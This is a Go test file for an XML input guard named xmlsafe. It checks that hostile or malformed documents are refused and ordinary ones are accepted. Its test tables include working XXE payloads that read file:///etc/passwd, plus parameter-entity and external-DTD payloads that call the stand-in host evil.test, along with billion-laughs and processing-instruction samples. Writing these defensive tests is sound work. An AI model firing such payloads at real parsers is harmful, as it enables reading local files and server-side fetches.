package xmlsafe

import (
	"strings"
	"testing"
)

// The attacks, each refused by a rule that names it. This is the table the
// package exists for: every one of these is a document some XML library
// would have expanded, fetched or looped on.
func TestTheAttacksAreRefusedByName(t *testing.T) {
	for _, tc := range []struct {
		name string
		doc  string
		want Reason
	}{
		{"an external entity", `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`, DOCTYPE},
		{"an empty doctype", `<!DOCTYPE r><r/>`, DOCTYPE},
		{"a parameter entity", `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.test/e">%p;]><r/>`, DOCTYPE},
		{"the billion laughs", `<!DOCTYPE r [<!ENTITY a "aa"><!ENTITY b "&a;&a;">]><r>&b;</r>`, DOCTYPE},
		{"an external DTD", `<!DOCTYPE r SYSTEM "http://evil.test/r.dtd"><r/>`, DOCTYPE},
		{"a lowercase doctype", `<!doctype r><r/>`, DOCTYPE},
		{"an entity reference with no declaration", `<r>&x;</r>`, Entity},
		{"an entity reference in an attribute", `<r a="&x;"/>`, Entity},
		{"a notation declaration", `<!NOTATION n SYSTEM "x"><r/>`, DOCTYPE},
		{"a processing instruction", `<?php echo 1 ?><r/>`, ProcessingInstruction},
		{"a processing instruction inside an element", `<r><?php ?></r>`, ProcessingInstruction},
		{"a document that is not UTF-8", "<r>\xff\xfe</r>", Encoding},
		{"two root elements", `<a/><b/>`, Malformed},
		{"a mismatched end tag", `<a></b>`, Malformed},
		{"an unterminated element", `<a><b>`, Malformed},
		{"a duplicate attribute", `<a x="1" x="2"/>`, Malformed},
		{"an unquoted attribute value", `<a x=1/>`, Malformed},
		{"a < in an attribute value", `<a x="<"/>`, Malformed},
		{"no root element at all", `   `, Malformed},
		{"a character reference that is not a character", `<r>&#xD800;</r>`, Malformed},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := Check([]byte(tc.doc), Default())
			if err == nil {
				t.Fatalf("%s was accepted", tc.name)
			}
			if got := ReasonOf(err); got != tc.want {
				t.Errorf("%s: reason %q, want %q (%v)", tc.name, got, tc.want, err)
			}
		})
	}
}

// And the ordinary documents an XML API receives are accepted, because a
// guard that refuses everything is not one.
func TestOrdinaryDocumentsPass(t *testing.T) {
	for _, doc := range []string{
		`<?xml version="1.0" encoding="UTF-8"?><order id="1"><item sku="A">Widget</item></order>`,
		`<r/>`,
		`<r></r>`,
		`<r><![CDATA[<not markup & not a reference>]]></r>`,
		`<!-- a comment --><r>text &amp; more &#x41;</r>`,
		`<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns:Get xmlns:ns="urn:x"/></soap:Body></soap:Envelope>`,
		`<r xml:lang="en" a='single'>text</r>`,
		"<r>\n  <kéy>café</kéy>\n</r>",
		`<r>a<b/>c<d/>e</r>`,
	} {
		if err := Check([]byte(doc), Default()); err != nil {
			t.Errorf("%s\nwas refused: %v", doc, err)
		}
	}
}

// Every bound, each with a document that is inside it and one that is not.
func TestEveryBoundIsEnforced(t *testing.T) {
	deep := func(n int) string {
		return strings.Repeat("<a>", n) + strings.Repeat("</a>", n)
	}
	for _, tc := range []struct {
		name string
		lim  func(*Limits)
		ok   string
		bad  string
		want Reason
	}{
		{"size", func(l *Limits) { l.MaxBytes = 32 }, `<r>hello</r>`, `<r>` + strings.Repeat("x", 64) + `</r>`, Size},
		{"depth", func(l *Limits) { l.MaxDepth = 4 }, deep(4), deep(5), Depth},
		{"elements", func(l *Limits) { l.MaxElements = 4 }, `<r><a/><b/><c/></r>`, `<r><a/><b/><c/><d/></r>`, Elements},
		{"attributes", func(l *Limits) { l.MaxAttributes = 2 }, `<r a="1" b="2"/>`, `<r a="1" b="2" c="3"/>`, Attributes},
		{"name length", func(l *Limits) { l.MaxNameBytes = 8 }, `<shortish/>`, `<` + strings.Repeat("n", 9) + `/>`, NameLength},
		{"text length", func(l *Limits) { l.MaxTextBytes = 8 }, `<r>12345678</r>`, `<r>123456789</r>`, TextLength},
		{"text length in a CDATA section", func(l *Limits) { l.MaxTextBytes = 8 }, `<r><![CDATA[12345678]]></r>`, `<r><![CDATA[123456789]]></r>`, TextLength},
		{"text length in an attribute", func(l *Limits) { l.MaxTextBytes = 8 }, `<r a="12345678"/>`, `<r a="1234567890"/>`, TextLength},
	} {
		t.Run(tc.name, func(t *testing.T) {
			lim := Default()
			tc.lim(&lim)
			if err := Check([]byte(tc.ok), lim); err != nil {
				t.Errorf("a document inside the %s bound was refused: %v", tc.name, err)
			}
			err := Check([]byte(tc.bad), lim)
			if err == nil {
				t.Fatalf("a document over the %s bound was accepted", tc.name)
			}
			if got := ReasonOf(err); got != tc.want {
				t.Errorf("%s: reason %q, want %q (%v)", tc.name, got, tc.want, err)
			}
		})
	}
}

// Nesting is bounded before this process's own stack is: a document
// thousands deep must be refused rather than crash the scanner.
func TestDeepNestingIsRefusedWithoutRecursing(t *testing.T) {
	doc := strings.Repeat("<a>", 100000) + strings.Repeat("</a>", 100000)
	err := Check([]byte(doc), Limits{MaxDepth: 64, MaxElements: 1 << 20, MaxNameBytes: 8})
	if ReasonOf(err) != Depth {
		t.Fatalf("a hundred thousand deep: %v", err)
	}
}

func TestCDATAAndCommentsCanBeRefused(t *testing.T) {
	lim := Default()
	lim.AllowCDATA = false
	lim.AllowComments = false
	if got := ReasonOf(Check([]byte(`<r><![CDATA[x]]></r>`), lim)); got != CDATA {
		t.Errorf("CDATA with it off: %q", got)
	}
	if got := ReasonOf(Check([]byte(`<r><!-- x --></r>`), lim)); got != Comment {
		t.Errorf("a comment with it off: %q", got)
	}
	if got := ReasonOf(Check([]byte(`<!-- x --><r/>`), lim)); got != Comment {
		t.Errorf("a comment before the root with it off: %q", got)
	}
	lim.AllowProcessingInstructions = true
	if err := Check([]byte(`<?xml-stylesheet href="x"?><r/>`), lim); err != nil {
		t.Errorf("a processing instruction with them on: %v", err)
	}
}

// The document shape policy: a root that must be what it says, and an
// element set that is a positive model without a schema language.
func TestTheShapePolicyDecidesRootAndElements(t *testing.T) {
	const soapNS = "http://schemas.xmlsoap.org/soap/envelope/"
	envelope := `<soap:Envelope xmlns:soap="` + soapNS + `"><soap:Body><Get/></soap:Body></soap:Envelope>`
	lim := Default()
	lim.Root, lim.RootNamespace = "Envelope", soapNS
	if err := Check([]byte(envelope), lim); err != nil {
		t.Errorf("a SOAP envelope: %v", err)
	}
	for _, tc := range []struct {
		name, doc string
	}{
		{"another root", `<order/>`},
		{"the right name in another namespace", `<soap:Envelope xmlns:soap="urn:not-soap"><soap:Body/></soap:Envelope>`},
		{"the right name with no namespace", `<Envelope><Body/></Envelope>`},
	} {
		if got := ReasonOf(Check([]byte(tc.doc), lim)); got != Root {
			t.Errorf("%s: reason %q, want %q", tc.name, got, Root)
		}
	}
	// The name on its own, with no namespace requirement beside it.
	byName := Default()
	byName.Root = "order"
	if err := Check([]byte(`<order><item/></order>`), byName); err != nil {
		t.Errorf("the required root: %v", err)
	}
	if got := ReasonOf(Check([]byte(`<basket><item/></basket>`), byName)); got != Root {
		t.Errorf("another root with no namespace requirement: %q, want %q", got, Root)
	}
	if got := ReasonOf(Check([]byte(`<ns:order xmlns:ns="urn:x"/>`), byName)); got != "" {
		t.Errorf("the required root in some namespace: %q", got)
	}

	lim = Default()
	lim.AllowElements = map[string]bool{"order": true, "item": true}
	if err := Check([]byte(`<order><item/></order>`), lim); err != nil {
		t.Errorf("an allowed shape: %v", err)
	}
	if got := ReasonOf(Check([]byte(`<order><item/><script/></order>`), lim)); got != Element {
		t.Errorf("an element outside the set: %q", got)
	}
	lim = Default()
	lim.DenyElements = map[string]bool{"password": true}
	if got := ReasonOf(Check([]byte(`<order><password>x</password></order>`), lim)); got != Element {
		t.Errorf("a denied element: %q", got)
	}
	if err := Check([]byte(`<order><item/></order>`), lim); err != nil {
		t.Errorf("a document without the denied element: %v", err)
	}
}

// A document type declaration is refused *as one*, by name, because that
// is what an operator sees in the log and has to recognise: it is where an
// external entity or a billion laughs would have been, and "a declaration"
// on its own does not say so.
func TestADoctypeIsNamedAsOne(t *testing.T) {
	for _, doc := range []string{
		`<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
		`<!DOCTYPE r SYSTEM "http://evil.test/r.dtd"><r/>`,
		`<!doctype html><r/>`,
	} {
		err := Check([]byte(doc), Default())
		if ReasonOf(err) != DOCTYPE {
			t.Fatalf("%s: %v", doc, err)
		}
		if !strings.Contains(err.Error(), "document type declaration") {
			t.Errorf("the refusal of %s does not name it: %v", doc, err)
		}
	}
}

// A refusal says where it happened, because an operator reading it has the
// document in front of them.
func TestARefusalSaysWhereAndWhy(t *testing.T) {
	err := Check([]byte(`<r><a/>&evil;</r>`), Default())
	if err == nil {
		t.Fatal("accepted")
	}
	msg := err.Error()
	for _, want := range []string{"entity", "&evil;", "byte"} {
		if !strings.Contains(msg, want) {
			t.Errorf("%q does not mention %q", msg, want)
		}
	}
	if ReasonOf(nil) != "" {
		t.Error("a nil error has a reason")
	}
	if ReasonOf(errNotOurs{}) != "" {
		t.Error("another error has one of our reasons")
	}
}

type errNotOurs struct{}

func (errNotOurs) Error() string { return "not ours" }
